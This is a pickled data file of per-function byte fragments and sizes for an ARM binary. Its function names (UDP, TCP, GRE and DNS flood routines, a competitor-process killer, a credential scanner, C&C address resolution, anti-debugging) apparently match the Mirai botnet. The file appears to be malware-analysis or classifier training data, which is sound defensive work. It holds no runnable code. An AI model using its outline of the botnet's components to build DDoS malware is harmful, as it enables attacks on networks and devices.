(lp0
(S'_init'
p1
S'0ddfe200eb33ebaf1b'
p2
L24L
tp3
a(S'__do_global_dtors_aux'
p4
S'30e900d50053e3800094e520e3000a833002a0e520e3'
p5
L104L
tp6
a(S'call___do_global_dtors_aux'
p7
S'042d'
p8
L8L
tp9
a(S'frame_dummy'
p10
S'3c9fe500042de51011'
p11
L68L
tp12
a(S'call_frame_dummy'
p13
S'042d'
p14
L8L
tp15
a(S'_start'
p16
S'00a0e420e500e5c00c9fe52f00'
p17
L44L
tp18
a(S'attack_app_http'
p19
S''
p20
L7608L
tp21
a(S'attack_get_opt_str'
p22
S'ff000050e3402de240a0dad10253e1c00400090004dc0253e1c0e0e2000ca01aa0e804a0'
p23
L100L
tp24
a(S'attack_get_opt_ip'
p25
S'10e9ff0203e130eb00010010e804a0'
p26
L48L
tp27
a(S'attack_get_opt_int'
p28
S'10e9ff0203e130eb000aa00a40bdea'
p29
L52L
tp30
a(S'attack_start'
p31
g20
L232L
tp32
a(S'attack_parse'
p33
g20
L596L
tp34
a(S'attack_kill_all'
p35
S'702de560a0e200ea54e1000a0009a00a00048405'
p36
L72L
tp37
a(S'add_attack'
p38
g20
L92L
tp39
a(S'attack_init'
p40
S'042de310eb00e5'
p41
L132L
tp42
a(S'attack_gre_eth'
p43
g20
L1912L
tp44
a(S'attack_gre_ip'
p45
g20
L1816L
tp46
a(S'attack_tcp_stomp'
p47
g20
L2140L
tp48
a(S'attack_tcp_ack'
p49
g20
L1904L
tp50
a(S'attack_tcp_syn'
p51
g20
L1856L
tp52
a(S'attack_udp_plain'
p53
g20
L704L
tp54
a(S'attack_udp_generic'
p55
g20
L1404L
tp56
a(S'attack_udp_vse'
p57
g20
L1216L
tp58
a(S'attack_udp_dns'
p59
g20
L1960L
tp60
a(S'checksum_generic'
p61
S'0151e3c000a0e520e51002e100038c0280'
p62
L92L
tp63
a(S'checksum_tcpudp'
p64
S'02a0e3402de1688000080000a0e520e5c08300e0e010ca5ce3300504a0e128e528e030e118e030e0280a38e100e1'
p65
L176L
tp66
a(S'mem_exists'
p67
S'0153e1402dd340a0e100ca51e2003a20e730e500018c00a00a100180'
p68
L92L
tp69
a(S'killer_kill'
p70
S'089fe500e312'
p71
L16L
tp72
a(S'killer_kill_by_port'
p73
g20
L1380L
tp74
a(S'killer_init'
p75
g20
L1696L
tp76
a(S'anti_gdb_entry'
p77
S'089fe530e5'
p78
L16L
tp79
a(S'teardown_connection'
p80
S'10e90094e500b50000e001a0e540bd'
p81
L40L
tp82
a(S'ensure_single_instance'
p83
g20
L356L
tp84
a(S'main'
p85
g20
L2216L
tp86
a(S'resolve_cnc_addr'
p87
S'702de308eb10e308eb00eb50a0e308eb0058609fe580140000d5600beb3104869600eb00eb10e308eb20e530e534e114e100e530e540bd'
p88
L140L
tp89
a(S'rand_next'
p90
S'702de5609fe530e5e0e5409fe53522009ee5c004e010e52070'
p91
L72L
tp92
a(S'rand_str'
p93
S'30e900e1800a000154e34044e2000a'
p94
L96L
tp95
a(S'rand_alphastr'
p96
S'30e901e150a0e500e30d54e300da00009aa0e330e210e010018c045ce310e404e1'
p97
L144L
tp98
a(S'rand_init'
p99
S'30e9540ceb30e50beb40a0eb509fe5402400e50d95e520e530e030e5'
p100
L76L
tp101
a(S'resolv_skip_name'
p102
S'01a0e5e0e5e0e330e50003a00a009a8c0343e200e50001a0e1'
p103
L120L
tp104
a(S'resolv_entries_free'
p105
S'10e91094e5007d0004a0e8'
p106
L36L
tp107
a(S'resolv_domain_to_hostname'
p108
S'30e901a0e109ebe0e100e2c000d50053e30001c4200504a00350850140e240a0e310ef'
p109
L116L
tp110
a(S'resolv_lookup'
p111
g20
L1096L
tp112
a(S'consume_any_prompt'
p113
S'1890e520e2001530e500000b000c002353e3000a000a000280000ad3003a5313000a53e3'
p114
L116L
tp115
a(S'can_consume'
p116
S'1890e500e020e10083'
p117
L32L
tp118
a(S'scanner_kill'
p119
S'089fe500e30a'
p120
L16L
tp121
a(S'deobf'
p122
S'702de150a0eb00af0ceb20018260a0eb4094e50000da20e730e230e720e1'
p123
L96L
tp124
a(S'add_auth_entry'
p125
g20
L284L
tp126
a(S'setup_connection'
p127
S'702de100e260a0e360'
p128
L208L
tp129
a(S'recv_strip_null'
p130
S'10e974000050e3804110e70004c220e1'
p131
L56L
tp132
a(S'scanner_init'
p133
g20
L6012L
tp134
a(S'table_retrieve_val'
p135
S'209fe501e000053015021130'
p136
L40L
tp137
a(S'toggle_obf'
p138
S'80e1402de330e10ae030e220e530e504e134e138e2500322ff02'
p139
L176L
tp140
a(S'table_lock_val'
p141
S'ff00cf'
p142
L8L
tp143
a(S'table_unlock_val'
p144
S'ff00cd'
p145
L8L
tp146
a(S'add_entry'
p147
g20
L76L
tp148
a(S'table_init'
p149
S'042de313e3'
p150
L808L
tp151
a(S'util_strlen'
p152
S'00a0e5000e'
p153
L40L
tp154
a(S'util_strncmp'
p155
g20
L96L
tp156
a(S'util_strcmp'
p157
S'702de150a0eb60a0e1'
p158
L88L
tp159
a(S'util_memcpy'
p160
S'0052e3'
p161
L36L
tp162
a(S'util_strcpy'
p163
S'702de100e1'
p164
L48L
tp165
a(S'util_zero'
p166
S'0051e3'
p167
L36L
tp168
a(S'util_itoa'
p169
g20
L220L
tp170
a(S'util_memsearch'
p171
S'0153e1402de150a0e100da00e380fb'
p172
L104L
tp173
a(S'util_stristr'
p174
g20
L120L
tp175
a(S'util_atoi'
p176
g20
L300L
tp177
a(S'util_fdgets'
p178
g20
L96L
tp179
a(S'util_local_addr'
p180
g20
L156L
tp181
a(S'__udivsi3'
p182
S'0151e2'
p183
L248L
tp184
a(S'__aeabi_uidivmod'
p185
S'03e90640bde0100e'
p186
L24L
tp187
a(S'__umodsi3'
p188
S'0151e2003a0000a081'
p189
L204L
tp190
a(S'__modsi3'
p191
S'0051e3000a1000b00060420151e20000a081009a51e30001a032'
p192
L228L
tp193
a(S'fcntl'
p194
S'0e00e90c9de5300014'
p195
L116L
tp196
a(S'fcntl64'
p197
S'0e00e914'
p198
L80L
tp199
a(S'chdir'
p200
S'10e9017000e1009ae230e300'
p201
L44L
tp202
a(S'close'
p203
S'10e9017000e1009ae230e300'
p204
L44L
tp205
a(S'fork'
p206
S'10e9017000e1009ae230e300'
p207
L44L
tp208
a(S'getpid'
p209
S'10e9017000e1009ae230e300'
p210
L44L
tp211
a(S'getppid'
p212
S'10e9017000e1009ae230e300'
p213
L44L
tp214
a(S'ioctl'
p215
S'0e00e914'
p216
L80L
tp217
a(S'kill'
p218
S'10e9017000e1009ae230e300'
p219
L44L
tp220
a(S'open'
p221
S'0e00e90c9de530e2301503a0e100e340a09ae230e300e240bde2'
p222
L92L
tp223
a(S'creat'
p224
S'01a0e5'
p225
L12L
tp226
a(S'prctl'
p227
S'10e9ac00e340a09ae230e300'
p228
L48L
tp229
a(S'read'
p230
S'10e9017000e1009ae230e300'
p231
L44L
tp232
a(S'readlink'
p233
S'10e9017000e1009ae230e300'
p234
L44L
tp235
a(S'select'
p236
S'10e98e90ef017000e1009ae230e300'
p237
L48L
tp238
a(S'setsid'
p239
S'10e9017000e1009ae230e300'
p240
L44L
tp241
a(S'sigprocmask'
p242
S'0051e30010e904001630e330ea7000e1009ae230e320e1'
p243
L84L
tp244
a(S'time'
p245
S'10e9017000e1009ae230e300'
p246
L44L
tp247
a(S'unlink'
p248
S'10e9017000e1009ae230e300'
p249
L44L
tp250
a(S'write'
p251
S'10e9017000e1009ae230e300'
p252
L44L
tp253
a(S'closedir'
p254
g20
L164L
tp255
a(S'opendir'
p256
g20
L248L
tp257
a(S'readdir'
p258
S'30e9104de230e110e120e1'
p259
L192L
tp260
a(S'__errno_location'
p261
S'009fe5'
p262
L8L
tp263
a(S'clock'
p264
S'042de200eb20e530e502e001e3d0'
p265
L48L
tp266
a(S'memset'
p267
S'00a0e300ba018101c31420fb'
p268
L120L
tp269
a(S'inet_addr'
p270
S'042de210eb0000e0009d15'
p271
L36L
tp272
a(S'accept'
p273
S'10e9017000e1009ae230e300'
p274
L44L
tp275
a(S'bind'
p276
S'10e9017000e1009ae230e300'
p277
L44L
tp278
a(S'connect'
p279
S'10e9017000e1009ae230e300'
p280
L44L
tp281
a(S'getsockname'
p282
S'10e9017000e1009ae230e300'
p283
L44L
tp284
a(S'getsockopt'
p285
S'10e92701e340a09ae230e300'
p286
L48L
tp287
a(S'listen'
p288
S'10e9017000e1009ae230e300'
p289
L44L
tp290
a(S'recv'
p291
S'10e9017000e1009ae230e300'
p292
L44L
tp293
a(S'recvfrom'
p294
S'30e93094e8017000e1009ae230e300'
p295
L52L
tp296
a(S'send'
p297
S'10e9017000e1009ae230e300'
p298
L44L
tp299
a(S'sendto'
p300
S'30e93094e8017000e1009ae230e300'
p301
L52L
tp302
a(S'setsockopt'
p303
S'10e901e340a09ae230e300'
p304
L48L
tp305
a(S'socket'
p306
S'10e9017000e1009ae230e300'
p307
L44L
tp308
a(S'raise'
p309
S'10e9c9fd'
p310
L24L
tp311
a(S'sigaddset'
p312
S'0051e2e0e500da53e300ca9de400eaa0e500e3'
p313
L48L
tp314
a(S'sigemptyset'
p315
S'042de320eb00'
p316
L24L
tp317
a(S'signal'
p318
S'30e90050134de240a0da50e300d500da'
p319
L180L
tp320
a(S'__sigismember'
p321
S'0141e232e710e230e00013'
p322
L36L
tp323
a(S'__sigaddset'
p324
S'0141e2c20c90e710e220e131e3'
p325
L36L
tp326
a(S'__sigdelset'
p327
S'0141e2c20c90e710e220e131e3'
p328
L36L
tp329
a(S'malloc'
p330
S'702de3d001a00a0040008a8040'
p331
L316L
tp332
a(S'calloc'
p333
S'30e9900550e2000a'
p334
L88L
tp335
a(S'free'
p336
S'0050e3412d0810c0e270e500e1'
p337
L216L
tp338
a(S'realloc'
p339
g20
L264L
tp340
a(S'__heap_alloc'
p341
S'0091e5402de220e340a0e310e520ea5ce1003a820030008020e330150490e500048320013000e5800050e3'
p342
L148L
tp343
a(S'__heap_alloc_at'
p344
S'042de5e0e100ea60e030e1008a001a30e30012002c82000062008c049d2420089c15089ce53004'
p345
L140L
tp346
a(S'__heap_link_free_area'
p347
S'0052e330e5100508'
p348
L32L
tp349
a(S'__heap_link_free_area_after'
p350
S'0052e310150e'
p351
L20L
tp352
a(S'__heap_free'
p353
g20
L244L
tp354
a(S'abort'
p355
S'43df2c9fe531e1'
p356
L308L
tp357
a(S'atol'
p358
S'00a0e3'
p359
L12L
tp360
a(S'strtol'
p361
S'01a0'
p362
L8L
tp363
a(S'_stdlib_strto_l'
p364
g20
L404L
tp365
a(S'exit'
p366
S'104de210e530e100e1'
p367
L120L
tp368
a(S'sleep'
p369
g20
L416L
tp370
a(S'__uClibc_fini'
p371
S'10e95020e041a0eaa0e74054e2'
p372
L92L
tp373
a(S'__pthread_return_0'
p374
S'00a0'
p375
L8L
tp376
a(S'__check_one_fd'
p377
S'30e901a0e1fa'
p378
L52L
tp379
a(S'__uClibc_init'
p380
S'4420e500042de5'
p381
L76L
tp382
a(S'__uClibc_main'
p383
S'02e1e1e020e2c0019fe510e510e521e510e1200500a0e1fb'
p384
L536L
tp385
a(S'sigaction'
p386
S'702de2df00e150a00aa0e400e330eb1088941594301a9fe500e330e330e500101a10e3201130e100eb3001a0e330e340a00a30e130e220eb30e530e500e2'
p387
L220L
tp388
a(S'__syscall_rt_sigaction'
p389
S'10e9017000e1009ae230e300'
p390
L44L
tp391
a(S'_exit'
p392
S'00e100ef017000e1'
p393
L40L
tp394
a(S'fstat'
p395
S'10e901a0e100e340a09ae240e0008000eaa0e1010ba0e2'
p396
L80L
tp397
a(S'__getdents'
p398
g20
L148L
tp399
a(S'__getdents64'
p400
S'0ddfe2b0e2d003c3e3d0010b0d00e510ef017000e1009ae260e0008000ea000610eae008e140a0e530e500ead402e130e390850c59e124e1009a4be200e300eb00240070'
p401
L356L
tp402
a(S'getegid'
p403
S'10e9017000e1009ae230e300'
p404
L44L
tp405
a(S'geteuid'
p406
S'10e9017000e1009ae230e300'
p407
L44L
tp408
a(S'getgid'
p409
S'10e9017000e1009ae230e300'
p410
L44L
tp411
a(S'getuid'
p412
S'10e9017000e1009ae230e300'
p413
L44L
tp414
a(S'lseek64'
p415
S'702de1d002e110e120e100e340a09ae240e0008000ea0004a0e100ea'
p416
L100L
tp417
a(S'nanosleep'
p418
S'10e9017000e1009ae230e300'
p419
L44L
tp420
a(S'sbrk'
p421
S'30e90094e50000e1001a000050e300ba0055e340a0e0000a000050e300aa00e300'
p422
L84L
tp423
a(S'times'
p424
S'10e9017000e1009ae230e300'
p425
L44L
tp426
a(S'__xstat64_conv'
p427
g20
L784L
tp428
a(S'__xstat_conv'
p429
S'702de150a0e320e1f9'
p430
L204L
tp431
a(S'_memcpy'
p432
S'0051e1003a'
p433
L1160L
tp434
a(S'inet_aton'
p435
S'0050e3402de150a013001a00ea93e530e530e700e3000a40a0ea2330e20000ca80c0'
p436
L232L
tp437
a(S'_dl_aux_init'
p438
S'1c90e530e520e510'
p439
L28L
tp440
a(S'brk'
p441
S'042de100e130e3002a'
p442
L56L
tp443
a(S'__do_global_ctors_aux'
p444
S'289fe520e50010e910a0e120fa'
p445
L48L
tp446
a(S'call___do_global_ctors_aux'
p447
S'042d'
p448
L8L
tp449
a(S'_fini'
p450
S'0ddfe2cc'
p451
L20L
tp452
a.